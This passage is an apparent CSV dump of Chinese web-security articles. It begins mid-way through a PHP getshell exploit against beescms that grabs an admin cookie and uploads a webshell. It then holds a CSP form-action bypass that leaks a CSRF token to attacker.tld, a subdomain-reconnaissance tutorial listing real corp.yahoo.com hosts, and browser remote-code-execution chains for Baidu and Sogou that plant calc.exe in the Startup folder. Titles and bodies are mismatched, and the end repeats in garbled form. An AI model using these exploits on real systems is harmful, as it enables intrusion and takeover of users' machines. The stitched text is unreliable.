Cannot get Cookie...');}echo ""[+]Got Cookie:"".$match[1].""\r\n"";  echo ""[+]Now trying to getshell...\r\n"";  $tmp = myCurl($uri.""/admin/upload.php"",$payload2,$match[1]);preg_match('#val\(\'(.*)\'\)#',$tmp,$shell);  if(!isset($shell[1])){          die('[-]Opps! Cannot get shell... see below\r\n'.$tmp);}echo ""[+]Your shell:"".$uri.""/upload/"".$shell[1]."" [password]:x"";   function myCurl($url,$postData='',$cookie=''){          $ch = curl_init();        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_POST, true);        curl_setopt($ch, CURLOPT_HEADER, 1);        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);          if($cookie != ''){                curl_setopt($ch, CURLOPT_COOKIE, $cookie);        }        $ret = curl_exec($ch);        curl_close($ch);        return $ret;}","2016-10-29 15:49:15","Web安全","代码审计就该这么来3 beescms getshell","http://nsoad.com/Article/web/20161029/662.html"
"5ccbfa624f2f0a0a7a69c060","CSP(Content-Security-Policy)是一个HTTP响应头，该响应头包含了指示浏览器如何限制页面上的内容的指令。 例如，”form-action”指令限制了可以提交的原始表单。","kong","CSP(Content-Security-Policy)是一个HTTP响应头，该响应头包含了指示浏览器如何限制页面上的内容的指令。 例如，”form-action”指令限制了可以提交的原始表单。CSP form-action指令可以限制页面可以提交表单到那些URL。在XSS/HTML注入错误的情况下，可以绕过此保护。form-action指令要理解为什么”form-action”指令从安全角度来说很重要，请想象下面这种情况：Content-Security-Policy: default-src ‘none’; &lt;html&gt;&lt;body&gt;&lt;div&gt;[Reflected XSS vulnerability here]&lt;/div&gt;&lt;form method=”POST” id=”subscribe” action=”/api/v1/newsletter/subscribe”&gt;&lt;input type=”hidden” name=”csrftoken” value=”5f4dcc3b5aa765d61d8327deb882cf99” /&gt;&lt;input type=”submit” value=”Subscribe to newsletter” /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;  由于CSP不允许脚本，我们不能使用脚本来提取csrf令牌。 然而，通过注入一个&lt;form&gt;标签，我们可以覆盖提交表单（包括csrf令牌）的位置：Content-Security-Policy: default-src ‘none’; &lt;html&gt;&lt;body&gt;&lt;div&gt;&lt;form action=”http://attacker.tld”&gt;&lt;/div&gt;&lt;form method=”POST” id=”subscribe” action=”/api/v1/newsletter/subscribe”&gt;&lt;input type=”hidden” name=”csrftoken” value=”5f4dcc3b5aa765d61d8327deb882cf99” /&gt;&lt;input type=”submit” value=”Subscribe to newsletter” /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;  在Chrome中绕过可以通过将现有表单的方法（使用formmethod属性）重写为”GET”并将操作（使用formaction属性）重写为””（当前页面）来绕过该伪指令。然后，我们将此与泄露元素相结合（例如“&lt;link rel=’subresource’ href =’http://attacker.tld/link-subresource’&gt;”）Content-Security-Policy: default-src ‘none’; &lt;html&gt;&lt;body&gt;&lt;div&gt;&lt;input value=""CLICK ME FOR POC"" type=""submit"" formaction="""" form=""subscribe"" formmethod=""get"" /&gt;&lt;input type=""hidden"" name=""xss"" form=""subscribe"" value=""&lt;link rel='subresource' href='http://attacker.tld/link-subresource'&gt;""/&gt;&lt;/div&gt;&lt;form method=""POST"" id=""subscribe"" action=""/api/v1/newsletter/subscribe""&gt;&lt;input type=""hidden"" name=""csrftoken"" value=""5f4dcc3b5aa765d61d8327deb882cf99"" /&gt;&lt;input type=""submit"" value=""Subscribe to newsletter"" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;  当受害者点击注入的提交按钮时，浏览器将把表单值作为GET参数发送到当前页面。 这些GET参数然后泄漏给attacker.tld，因为引用了泄露元素。换句话说，表单值（包括CSRF令牌）将通过Referer头发送到http://attacker.tld 。 form-action绕过成功。Demohttp://bugbounty.se/csp_bypass.php?xss=%3Cinput%20value=%22CLICK%20ME%20FOR%20POC%22%20type=%22submit%22%20formaction=%22%22%20form=%22subscribe%22%20formmethod=%22get%22%20/%3E%3Cinput%20type=%22hidden%22%20name=%22xss%22%20form=%22subscribe%22%20value=%22%3Clink%20rel=%27subresource%27%20href=%27http://attacker.tld/link-subresource%27%3E%22/%3E后果在Firefox中绕过Firefox的攻击本质上是一样的，但不是使用”&lt;link rel =’subresource’href =’http://attacker.tld”&gt;”，我们使用”&lt;a href =’http://attacker.tld’&gt;”，使用这个的缺点是用户必须点击两次而不是一次。来源链接：http://www.mottoin.com/93211.html","2016-12-06 16:16:04","Web安全","通过反射型 XSS 绕过配合 form-action 绕过 CSP","http://nsoad.com/Article/web/20161206/890.html"
"5ccbfa6c4f2f0a0a7a69c061","今天给大家介绍的是运行在我自己Web服务器中的一堆脚本，这些脚本可以帮助我快速检测SSRF、Blind XXS以及XXE漏洞，喜欢的朋友可以将它们部署到自己的环境中。","secist","当我们要对一个目标进行渗透时，我们往往需要去尽可能的挖掘目标可能存在的攻击面。就拿一个域名来说，当主站防御的比较死的时候，我们通常就会考虑其子站。因为相对主站而言，子站的安全性做的可能不那么全面。那么，我们该如何最大程度的将目标子域枚举出来呢？靠人工当然不行，其实在网上已经有很多专门用于挖掘子域的神器，例如 Fierce, SubBrute和Gobuster等。此外，还有一些在线网站也为我们提供了强劲的子域枚举功能，例如站长之家等。那么除此之外，还有没有什么比较好用的子域枚举神器呢？这里我要向大家推荐一款名为AQUATONE的子域挖掘神器。相比前面提及的枚举工具，AQUATONE不仅仅只是通过简单的子域爆破，它还会利用各种开放的互联网服务和资源，来协助其完成子域枚举任务，这也大大提高了子域的爆破率。当发现子域时，我们还可以使用AQUATONE来探测主机的公共HTTP端口，并收集响应头，HTML和屏幕截图，并能最终为我们生成一个报告，便于我们后续的分析利用。此外，AQUATONE被分为三个独立的命令（阶段）。如果你只想使用它来进行子域的发现，而无需任何的扫描或屏幕截图，你只需单独的执行其中一条命令即可。下面，让我们来看看AQUATONE评估的三个阶段：阶段1：发现为了向大家演示AQUATONE的用法，这里我将以corp.yahoo.com这个域名为例。之所以选择这个域名是因为Yahoo的漏洞赏金计划包含了所有* .yahoo.com的域名，所以运行这类爆破工具也是可被接受的。命令aquatone-discover是用以启动AQUATONE的：aquatone-discover做的第一件事，就是确定目标的主域名服务器。使用主域名服务器进行发现，不仅可以确保信息是最新的，而且还能将发现的结果最大化。此外，它还可以快速的测试目标域是否为通配符域。如果为通配符域，它将识别可能的通配符响应并将其过滤掉。庆幸的是我们测试的corp.yahoo.com没有被配置为通配符。在进行完主域名服务器和通配符检测后，AQUATONE将会向每个子域收集器模块，询问目标域下的潜在子域。aquatone-discover共集成了以下收集器模块：    字典爆破（查看字典）    DNSDB.org    Google Transparency Report（Google透明度报告）    HackerTarget    Netcraft    Shodan (需要API key)    ThreatCrowd    VirusTotal (需要API key)收集器模块总返回了12.282个潜在的子域，aquatone-discover并对这些域名进行了相应的解析。在经过一段时间的收集，aquatone-discover共为我们找到了1.958存活的子域。它还分析了IP，并列出了可用于进一步探测的潜在IP子网范围：在aquatone评估目录下，它还为我们自动创建了一个以“目标域.hosts.txt”命名的文件，并将枚举的域名和IP以逗号分割打印在了文本中。224-si1.corp.yahoo.com,207.126.224.4224-si2.corp.yahoo.com,207.126.224.5227-si1.corp.yahoo.com,207.126.227.4227-si2.corp.yahoo.com,207.126.227.7232-si1.corp.yahoo.com,207.126.232.4232-si2.corp.yahoo.com,207.126.232.5351-si1.corp.yahoo.com,216.145.51.4351-si2.corp.yahoo.com,216.145.51.96998-dmz-foundry1.corp.yahoo.com,216.145.48.25998-dmz-foundry2.corp.yahoo.com,216.145.48.39aa-dc1.wpe.stg.test.corp.yahoo.com,98.137.139.80aa-dc2.wpe.stg.test.corp.yahoo.com,98.137.139.81aaa1-1-a-gci.corp.yahoo.com,216.145.50.84aaa1-2-a-gci.corp.yahoo.com,216.145.50.87aahost1.stg.test.corp.yahoo.com,98.137.139.82aahost2.stg.test.corp.yahoo.com,98.137.139.83aahost3.stg.test.corp.yahoo.com,98.137.139.84aahost4.stg.test.corp.yahoo.com,98.137.139.85aape01.stg.test.corp.yahoo.com,98.137.139.93aavm1.stg.test.corp.yahoo.com,98.137.139.87阶段2：扫描在完成子域的收集工作后，接下来我们需要确定哪些子域可以被访问。但是面对这上千个网址，如果采取手动浏览的方式显然不太明智。这里我们可以让aquatone-scan，来帮助我们完成这个工作。在默认情况下aquatone-scan，将为我们扫描以下TCP端口：80,443,880,8080和8443，这些都是非常常见的Web服务端口。当然，我们还可以使用–ports选项来指定我们需要扫描的端口号，或者指定一个内置的列表别名：    small: 80, 443    medium: 80, 443, 8000, 8080, 8443 (same as default)    large: 80, 81, 443, 591, 2082, 2087, 2095, 2096, 3000, 8000, 8001, 8008, 8080, 8083, 8443, 8834, 8888    huge: 80, 81, 300, 443, 591, 593, 832, 981, 1010, 1311, 2082, 2087, 2095, 2096, 2480, 3000, 3128, 3333, 4243, 4567, 4711, 4712, 4993, 5000, 5104, 5108, 5800, 6543, 7000, 7396, 7474, 8000, 8001, 8008, 8014, 8042, 8069, 8080, 8081, 8088, 8090, 8091, 8118, 8123, 8172, 8222, 8243, 8280, 8281, 8333, 8443, 8500, 8834, 8880, 8888, 8983, 9000, 9043, 9060, 9080, 9090, 9091, 9200, 9443, 9800, 9981, 12443, 16080, 18091, 18092, 20720, 28017使用huge这个端口列表，你将会发现更多的Web服务，但与此同时也会增加aquatone-scan的扫描时间。aquatone-scan在corp.yahoo.com的评估目录中创建了两个新文件：open_ports.txt中包含了主机IP以及对应开启的端口：117.104.189.54,443124.108.98.253,443124.108.98.254,443203.83.249.10,443203.83.249.4,443203.83.249.5,443203.83.249.8,443203.83.249.9,443209.131.62.228,443209.131.62.229,443209.131.62.230,443209.131.62.231,443216.145.48.148,443216.145.48.149,443216.145.48.150,443216.145.48.151,443216.145.48.152,443216.145.48.153,44372.30.2.113,443,8077.238.184.150,8098.136.163.125,80,44398.136.205.152,443,8098.136.205.216,443urls.txt则包含了可用于web请求的URL列表：http://bomgar.corp.yahoo.com/http://bouncer.gh.corp.yahoo.com/http://buzz.corp.yahoo.com/http://cloud.corp.yahoo.com/http://fifa.corp.yahoo.com/http://gemini.corp.yahoo.com/http://guest.corp.yahoo.com/http://insights.corp.yahoo.com/http://ipv6.corp.yahoo.com/http://marketingcentral.corp.yahoo.com/http://messenger.corp.yahoo.com/http://request.corp.yahoo.com/http://sas.corp.yahoo.com/http://services.corp.yahoo.com/http://shop.corp.yahoo.com/http://si.corp.yahoo.com/http://wireless.corp.yahoo.com/https://bomgar.corp.yahoo.com/https://bouncer.gh.corp.yahoo.com/https://fast.corp.yahoo.com/ 以上生成的这些文本，可直接被用于下一评估阶段。如果你想将这些结果导入到其它工具使用，你可以使用像grep，awk等这类命令或其他分割工具，将其划分成相应的格式再次利用。阶段3：收集经过上面两个阶段，我们已经获取了* .corp.yahoo.com的子域名和开放端口。下面我们将进入最后一个环节，使用aquatone-gather来收集HTTP响应和截图，并将结果生成报告：aquatone-gather会从之前AQUATONE创建的文件加载数据，并请求文本中的URL来收集HTTP响应和截图。aquatone-gather是基于Nightmare来完成繁重的请求任务和屏幕截图的。过了一会儿，aquatone-gather完成了所有的web请求。但从截图可以看到，当中出现了部分的failed。 Nightmare和许多其他的浏览器自动化工具一样，会在某些页面处理中出现失败的情况。最终aquatone-gather为我们打印了，成功和失败的页面处理简短摘要，以及生成了一份html格式的报告文件。但aquatone-gather为我们生成的文件远不止这些，我们查看评估文件夹可以看到，这里为我们创建了三个新的文件夹：headers, html,report和screenshots。其中headers文件夹中的文本文件，包含了所有访问页面的响应头信息：root@kali:~/aquatone/corp.yahoo.com/headers# cat bomgar_corp_yahoo_com__98_136_205_152__443.txtCache-Control: no-cacheConnection: Keep-AliveContent-Type: text/html; charset=utf-8Date: Wed, 14 Jun 2017 12:22:01 GMTExpires: Thu, 19 Nov 1981 08:52:00 GMTKeep-Alive: timeout=15, max=100Pragma: no-cacheServer: BomgarSet-Cookie: ns_s=c9b9309296cf5babeb7e193125cb2cf0f3c7f13c; path=/; secure; HttpOnlyStrict-Transport-Security: max-age=31536000Transfer-Encoding: chunkedX-Ua-Compatible: IE=edgeroot@kali:~/aquatone/corp.yahoo.com/headers#html文件夹则包含了所有访问页面的HTML主体信息：root@kali:~/aquatone/corp.yahoo.com/html# cat bomgar_corp_yahoo_com__98_136_205_152__443.html&lt;!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.1//EN"" ""http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd""&gt;&lt;html xmlns=""http://www.w3.org/1999/xhtml"" xml:lang=""en-us""&gt;&lt;head&gt;  &lt;meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"" /&gt;  &lt;title&gt;Yahoo! Global Service Desk LiveChat&lt;/title&gt;  &lt;meta name=""viewport"" content=""width=device-width, initial-scale=1.0, maximum-scale=1.0"" /&gt;&lt;link href=""/content/common.css"" rel=""stylesheet"" type=""text/css"" /&gt;&lt;link href=""/content/public.css"" rel=""stylesheet"" type=""text/css"" /&gt;&lt;link href=""/content/mobile.css"" rel=""stylesheet"" type=""text/css"" /&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=""container""&gt;&lt;div id=""header"" class=""contentBox""&gt;...&lt;div style=""display: none""&gt;&lt;div style=""margin: 1em;""&gt;  &lt;a href=""http://www.bomgar.com"" class=""inverse"" target=""_blank""&gt;Secure Remote Desktop Access by Bomgar&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;root@kali:~/aquatone/corp.yahoo.com/html# screenshots文件夹则包含了所有访问页面的PNG屏幕截图：root@kali:~/aquatone/corp.yahoo.com/screenshots# lsbomgar_corp_yahoo_com__98_136_205_152__443.pngbomgar_corp_yahoo_com__98_136_205_152__80.pngbouncer_gh_corp_yahoo_com__72_30_2_113__443.pngbouncer_gh_corp_yahoo_com__72_30_2_113__80.pngbuzz_corp_yahoo_com__77_238_184_150__80.pngcloud_corp_yahoo_com__77_238_184_150__80.png...si_corp_yahoo_com__77_238_184_150__80.pngvpn1-1-gci_eglbp_corp_yahoo_com__203_83_249_4__443.pngvpn1-1-ptn_corp_yahoo_com__216_145_48_151__443.pngvpn1-1-ptn_eglbp_corp_yahoo_com__203_83_249_10__443.pngvpn1-2-gci_sv6_corp_yahoo_com__209_131_62_228__443.pngvpn-1-gci_hongkong_corp_yahoo_com__117_104_189_54__443.pngvpn2-1-gci_eglbp_corp_yahoo_com__203_83_249_5__443.pngvpn2-1-ptn_corp_yahoo_com__216_145_48_152__443.pngvpn2-2-gci_sv6_corp_yahoo_com__209_131_62_229__443.pngvpn-2-gci_sv6_corp_yahoo_com__209_131_62_230__443.pngwireless_corp_yahoo_com__77_238_184_150__80.pngroot@kali:~/aquatone/corp.yahoo.com/screenshots#你可以直接在文件夹中浏览这些屏幕截图，但我建议大家最好是通过生成的HTML报告来进行查看，这样更有利于我们的整体分析。对于可能会导致安全问题的地方，AQUATONE将以红色或绿色背景为我们高亮显示：CLI技巧对于以上生成的这些文件，我们可以做很多事情。下面，我教大家一些查找其中有用信息的小技巧。获取服务器技术统计信息root@kali:~/aquatone/corp.yahoo.com/headers# cat * | grep 'Server:' | sort | uniq -c | sort -nr     13 Server: ATS      6 Server: Bomgar      1 Server: AkamaiGHostroot@kali:~/aquatone/corp.yahoo.com/headers#查找更多子域root@kali:~/aquatone/corp.yahoo.com/html# cat * | egrep -o '[a-z0-9\-\_\.]+\.corp\.yahoo\.com' | sort -ubomgar.corp.yahoo.combouncer.by.corp.yahoo.comfast.corp.yahoo.comit.corp.yahoo.comrequest.corp.yahoo.comservices.corp.yahoo.comroot@kali:~/aquatone/corp.yahoo.com/html#查找HTML注释root@kali:~/aquatone/corp.yahoo.com/html# cat * | egrep -o '&lt;!--.*--&gt;'&lt;!--//--&gt;&lt;!-- Begin comScore Tag --&gt;&lt;!-- bouncer02.gh.bf1.yahoo.com Wed Jun 14 12:22:09 UTC 2017 --&gt;&lt;!-- bouncer12-os.gh.bf2.yahoo.com Wed Jun 14 12:22:29 UTC 2017 --&gt;&lt;!-- #doc4 --&gt;&lt;!-- .dw1 --&gt;&lt;!-- .dw4 --&gt;...&lt;!-- /.shmod --&gt;&lt;!-- SpaceID=0 timeout (ads1) --&gt;&lt;!-- src2.ops.ir2.yahoo.com Wed Jun 14 12:22:15 UTC 2017 --&gt;&lt;!-- src4.ops.ir2.yahoo.com Wed Jun 14 12:21:44 UTC 2017 --&gt;&lt;!-- src4.ops.ir2.yahoo.com Wed Jun 14 12:21:51 UTC 2017 --&gt;&lt;!-- src4.ops.ir2.yahoo.com Wed Jun 14 12:22:27 UTC 2017 --&gt;&lt;!-- src6.ops.ir2.yahoo.com Wed Jun 14 12:21:57 UTC 2017 --&gt;&lt;!-- src6.ops.ir2.yahoo.com Wed Jun 14 12:22:15 UTC 2017 --&gt;&lt;!-- src6.ops.ir2.yahoo.com Wed Jun 14 12:22:36 UTC 2017 --&gt;&lt;!-- URL: /::ProfilerTotal:557:1497442917838::Page Creation:40:1497442917838::user_ups:0:1497442917844::ydht_time:1:1497442917845::Maple Execution:518:1497442917878::Maple WS:41:1497442917879::SHAdModule:457:1497442917921::SHLeftNavigationModule:7:1497442918378::SHHeroModule:0:1497442918385::SHBrowseShoppingModule:5:1497442918385::SHSocialNewBrowseModule:0:1497442918390::SHCopyrightModule:1:1497442918391:: --&gt;&lt;!-- web23.shop.bf1.yahoo.com --&gt;&lt;!-- web23.shop.bf1.yahoo.com Wed Jun 14 12:21:57 UTC 2017 --&gt;查找带有密码字段的页面root@kali:~/aquatone/corp.yahoo.com/html# grep 'type=""password""' *bouncer_gh_corp_yahoo_com__72_30_2_113__80.html: &lt;dd&gt;&lt;input class=""input-large"" name=""pass_word"" type=""password"" id=""pass_word"" maxlength=""64""   autocomplete=""off"" autocorrect=""off"" autocapitalize=""off"" spellcheck=""false"" &gt;&lt;/dd&gt;fast_corp_yahoo_com__98_136_205_216__443.html: &lt;dd&gt;&lt;input class=""input-large"" name=""pass_word"" type=""password"" id=""pass_word"" maxlength=""64""   autocomplete=""off"" autocorrect=""off"" autocapitalize=""off"" spellcheck=""false"" &gt;&lt;/dd&gt;root@kali:~/aquatone/corp.yahoo.com/html#获取端口为443的主机root@kali:~/aquatone/corp.yahoo.com# cat open_ports.txt | grep ',443' | cut -d "","" -f 1117.104.189.54124.108.98.253124.108.98.254203.83.249.10203.83.249.4...216.145.48.15372.30.2.11398.136.163.12598.136.205.15298.136.205.216root@kali:~/aquatone/corp.yahoo.com#检查HTTPS主机，是否存在心脏滴血漏洞root@kali:~/aquatone/corp.yahoo.com# grep https urls.txt | cut -d '/' -f 3 &gt; /tmp/targets.lstroot@kali:~/aquatone/corp.yahoo.com# sslscan --targets=/tmp/targets.lst --no-ciphersuites --no-fallback --no-renegotiation --no-compression --no-check-certificateVersion: 1.11.9-staticOpenSSL 1.0.2l-dev  xx XXX xxxxTesting SSL server bomgar.corp.yahoo.com on port 443 using SNI name  Heartbleed:TLS 1.2 not vulnerable to heartbleedTLS 1.1 not vulnerable to heartbleedTLS 1.0 not vulnerable to heartbleedTesting SSL server bouncer.gh.corp.yahoo.com on port 443 using SNI name...Testing SSL server vpn2-2-gci.sv6.corp.yahoo.com on port 443 using SNI name  Heartbleed:TLS 1.2 not vulnerable to heartbleedTLS 1.1 not vulnerable to heartbleedTLS 1.0 not vulnerable to heartbleedroot@kali:~/aquatone/corp.yahoo.com#","2017-06-20 15:45:02","安全工具","子域名发掘神器：AQUATONE","http://nsoad.com/Security-tools/20170620/tools-1159.html"
"5ccbfa6c4f2f0a0a7a69c062","搜狗浏览器从UXSS到远程命令执行","Kong","本文属于浏览器安全系列第二篇,目录如下2345浏览器本地文件读取及远程命令执行百度浏览器远程命令执行搜狗浏览器从UXSS到远程命令执行Fancy3D引擎（YY浏览器）远程命令执行免责声明本博客提供的部分文章思路可能带有攻击性，仅供安全研究与教学之用，风险自负!百度浏览器远程命令执行版本信息：8.4.100.3514测试环境：(1)Windows 7 64 bit with IE 10 (2)Windows XP 32 bit with IE 80x00 套路为了实现远程命令执行，我们需要有两个条件：（1）下载可执行文件（比如exe，脚本之类的）到用户的系统中（2）启动我们的可执行程序。接下来的分析都是为了实现这个目标而进行的一系列探索及尝试。0x01 UXSS与特权域一个价值8000美刀的UXSS：https://bugs.chromium.org/p/chromium/issues/detail?id=560011 ，百度浏览器上也存在该问题。各种特权域的XSS问题都已经被之前的老司机们挖没有了，所以我们从UXSS入手是最快捷的方式。那百度浏览器的特权域有什么呢？在使用的过程中发现，百度浏览器应用中心（https://chajian.baidu.com/2015/）这个网站直接能够打开 bdbrowser://settings 这个页面。于是，我就分析了一下里面的代码，发现是使用了widnow.external.StartRequest(1158, ""open_url"",  """",  ""[\""offside"",""bdbrowser://settings#extension\""]"")  从而可以确定，这个域名可以使用window.external.StartRequest这个API。也就是说：我们可以通过UXSS -&gt; 在百度浏览器应用中心的网站上调用以上的API。0x02 寻找文件下载在日常使用浏览器的过程中，我们可以设置一个默认的文件下载路径，然后选择不提示。在百度浏览器中，也存在一个这样子的设置，而且可以直接通过上面的API进行设置。所以，我们可以设置其默认不提示，这样子就不需要用户交互完成文件的下载！那么，我们能知道文件的下载路径吗？一开始我是想像二哥那样：http://wooyun.org/bugs/wooyun-2010-083294 寻找一个能够直接修改其默认下载路径的接口，这样子就可以通过下载文件到用户的开机启动路径中完成RCE。不过，百度浏览器修改了这个设置的API，设置时会弹出选择窗口给用户选择路径。 哎，于是，换一个思路吧。我们尝试看看能不能获取到用户设置的默认路径吧！分析调试设置页面的源代码之后，我发现了以下的操作就可以获取到用户的默认路径！window.external.StartRequest(1162, ""fetch_prefs.addListener"", ""console.log"", ""[]"", """", window);  window.external.StartRequest(1163, ""preference_ready"", """", ""[]"", """", window); 0x03 执行？完成文件的下载，我们又知道了文件在用户系统中的绝对路径。这个能干嘛啊？在寻找的过程中，我搜索了一下，找到了这样的一个链接：http://stackoverflow.com/a/5047811/1634804 这里是指在IE上通过ActiveXObject启动notepad.exe的代码。想到百度浏览器还有一个IE内核的时候，还是试试吧。没想到一试，发现居然可以直接执行，是的，什么提示都没有。一开始我还怀疑是我自己设置了IE的安全级别，发现测了手上的几个系统，还在虚拟机环境下进行测试，都发现能打开notepad。  ws=new ActiveXObject(""WScript.Shell"");  ws.Exec(""C:\\Windows\\notepad.exe"");    而在同一个系统上的IE浏览器，访问这个页面的时候会提示以下的信息。从这可以估计出百度浏览器在使用IE内核的时候，安全性级别设置的比较低。SCRIPT429: Automation 服务器不能创建对象  接下来，我们要怎么利用？在使用的过程中，发现百度浏览器大多会先使用WebKit引擎进行渲染，而且，我查了一下，没有任何可以设置的方式。所以，第一个想到的方案是做个界面欺骗用户切换成IE模式，这样子我们的RCE就大打折扣。0x04 WebKit -&gt; IE想啊想！心中想起了一句话：中国特色社会主义。在China，很多银行的网站都默认只能使用IE，访问这些网站的时候，百度浏览器会不会很人性化的帮我们切换成IE内核呢？于是，继续测试，发现果然！打开工行，招行等银行的网站时，优先使用的是IE内核。 于是，我们只要找到一个网站是银行的，且这个网站存在XSS或者前端界面可控的，就可以通过这个网站执行ActiveXObject了。不过找银行的貌似挺麻烦的，找了一会之后，我把思路换成了学校，因为学校的网站（edu.cn的子域）也是默认优先IE内核。找啊找，找到一个XSS，被IE的过滤器过滤，找到另外一个不会被过滤的，URL长度有限制且有关键词检查。最后，还是在母校找到了一个站点：http://ecampus.sysu.edu.cn/zsuoa/application/pages/select_frame.jsp?url=http://baidu.com  这个页面会去加载使用iframe去加载url里执订的链接，虽然不是XSS，但是更好用！0x05 真的可以执行思路总结UXSS 到 https://chajian.baidu.com/2015/修改用户的下载设置：自动下载到默认保存位置 (不再弹窗提醒)获取用户的的默认下载路径下载一个文件跳转到学校的网站，使用ActiveXObject执行我们下载的文件。测试的GIF截图，下载并启动Everything。","2016-10-18 17:30:11","Web安全","百度浏览器远程命令执行","http://nsoad.com/Article/web/20161018/591.html"
"5ccbfa6c4f2f0a0a7a69c063","百度浏览器远程命令执行","Kong","本文属于浏览器安全系列第三篇,目录如下2345浏览器本地文件读取及远程命令执行百度浏览器远程命令执行搜狗浏览器从UXSS到远程命令执行Fancy3D引擎（YY浏览器）远程命令执行免责声明本博客提供的部分文章思路可能带有攻击性，仅供安全研究与教学之用，风险自负!0x00 首先是UXSS具体见：https://bugs.chromium.org/p/chromium/issues/detail?id=569496浏览器版本号：6.3.8.212790x01 既然可以UXSS，我们找个特权域从漏洞 http://wooyun.org/bugs/wooyun-2010-0145023 我们可以知道搜狗浏览器的扩展有下载任意文件到任意位置的API！我们自己写一个恶意扩展，提交并通过审核的可能性基本为0。这个API这么好用，但又只能从：se-extension://域名下进行调用，好像很难构造吧。sogouExplorer.downloads.downloadSilently({    url:""http://tmxk.org/img/r-c.png"",  filename:""dd.exe"",  path:""d:\"",  method:""GET""})我在想怎么利用上面的UXSS的时候，突发奇想的测试了一下，我们能不能打到se-extension://这个域名，于是进行一下测试。我找了一个搜狗浏览器安装时启用的默认扩展，找到其background.html的地址：se-extension://ext238561744/background.html。结果当然是没有那么容易，会提示如下的信息：Denying load of se-extension://ext238561744/background.html. Resources must be listed in the webaccessibleresources manifest key in order to be loaded by pages outside the extension.0x02 难道没法子？我认真的读了两秒这个提示后，原来还允许开发者通过web_accessible_resources指定某些资源，从而实现在扩展外被访问！当然，我们就去试试运气去默认的扩展下找找看有没有吧。搜狗浏览器安装的插件在这个目录下：C:\Users\Username\AppData\Roaming\SogouExplorer\Extension  grep一下，找到了一个插件，搜狗打假助手，com.sogou.antiCrime，其manifest.xml文件中有以下的内容：于是就把要打的域名地址换成了：se-extension://ext238561744/jd/images/ac-logo.png  一开始我还觉得这是一个PNG图片，即使没有被拒绝访问，也应该用不了扩展的API吧。我本来是很怀疑能不能行的，正想放弃的时候，我还是觉得应该尝试一发。把PoC里的expolit.html里的f函数改一下，尝试下载一个文件到c:\Users\目录下。备注：后来想想其实也对，因为图片在浏览器打开的时候浏览器用自动的使用img标签插入来显示图片。...function f() {    console.log(""f()"")  if (++c1 == 2) {    var x1 = x.contentWindow[0].frameElement.nextSibling;    // x1.src = 'se-extension://ext238561744/background.html';         // Denied    x1.src = 'se-extension://ext238561744/jd/images/ac-logo.png';    try {      while (x1.contentDocument) { ml(); }    } catch(e) {      x1.src = ""javascript:if(location != 'about:blank') {console.log(location); sogouExplorer.downloads.downloadSilently({url:'http://127.0.0.1/test.js',filename:'test.js',path:'c:\\\\Users\\\\',method:'GET'});}""    }  }}...0x03 最终我们做到了！上面下载好文件之后，我们可以直接使用伪协议来执行，在 http://wooyun.org/bugs/wooyun-2010-0177221 最新版依旧没有加个提示什么的。而且现在我们又扩展名.js了。直接可以执行。当然，我们也可以写到用户的启动目录中，至于怎么拿到用户名，这个 http://wooyun.org/bugs/wooyun-2010-0176436 的漏洞都公开了，然后好像什么修复工作都没有做。location.href=""vbefile:/../../../../../../Users/test.js""  获取用户名的过程：用户访问open.html，跳转到data:域下window.location.href = ""data:text/html;base64,PHNjcmlwdCBzcmM9J2h0dHA6Ly8xMjcuMC4wLjEvZXZpbC5qcyc+PC9zY3JpcHQ+""  其中base64解密后内容为：&lt;script src='http://127.0.0.1/evil.js'&gt;&lt;/script&gt;  evil.js在data域下执行，可以获取到用户名列表，然后再跳转到需要写calc.exe到启动目录的页面中，完成写入操作！function getUsers(data) {    var users = data.match(/&lt;script&gt;addRow\(""([^""]+)""/g) || [];  var currentUser=[];  for(var i = 0; i &lt; users.length; i++) {    var user = (users[i].match(/&lt;script&gt;addRow\(""([^""]+)""/) || ["""", """"])[1];    if(["".."", ""All Users"", ""Default"", ""Default User"", ""Public"", ""UpdatusUser"", ""desktop.ini""].indexOf(user) == -1) {      currentUser.push(user);    }  }  console.log(currentUser);  return currentUser;}window.external.extension(""getRecommendSidebarExts"", ""file:///C:/Users/"", function () {    var data = JSON.parse(arguments[0]);  if (data.success != true)    return;  location.href = 'http://127.0.0.1/exploit.html?users=' + getUsers(data.data);});写文件到启动目录下：function f() {    console.log(""f()"")  if (++c1 == 2) {    var users = top.location.search.replace('?users=').split(',');    var x1 = x.contentWindow[0].frameElement.nextSibling;    // x1.src = 'se-extension://ext238561744/background.html';         // Denied    x1.src = 'se-extension://ext238561744/jd/images/ac-logo.png';    try {      while (x1.contentDocument) { ml(); }    } catch(e) {      var users_str = '';      for (var i = 0; i &lt; users.length; ++i) {        users_str += ('""' + users[i] + '""');        if (i != users.length - 1)          users_str += ',';      }      x1.src = ""javascript:if(location != 'about:blank') { var users=["" + users_str + ""]; for (var i = 0; i &lt; users.length; ++i) sogouExplorer.downloads.downloadSilently({url:'http://127.0.0.1/calc.exe',filename:'calc.exe',path:'C:\\\\Users\\\\' + users[i] + '\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\',method:'GET'});}""    }  }}录个用伪协议执行的GIFaddRow\(""([^""]+)""/g) || [];  var currentUser=[];  for(var i = 0; i < users.length; i++) {    var user = (users[i].match(/addRow\(""([^""]+)""/) || ["""", """"])[1];    if(["".."", ""All Users"", ""Default"", ""Default User"", ""Public"", ""UpdatusUser"", ""desktop.ini""].indexOf(user) == -1) {      currentUser.push(user);    }  }  console.log(currentUser);  return currentUser;}window.external.extension(""getRecommendSidebarExts"", ""file:///C:/Users/"", function () {    var data = JSON.parse(arguments[0]);  if (data.success != true)    return;  location.href = 'http://127.0.0.1/exploit.html?users=' + getUsers(data.data);});写文件到启动目录下：function f() {    console.log(""f()"")  if (++c1 == 2) {    var users = top.location.search.replace('?users=').split(',');    var x1 = x.contentWindow[0].frameElement.nextSibling;    // x1.src = 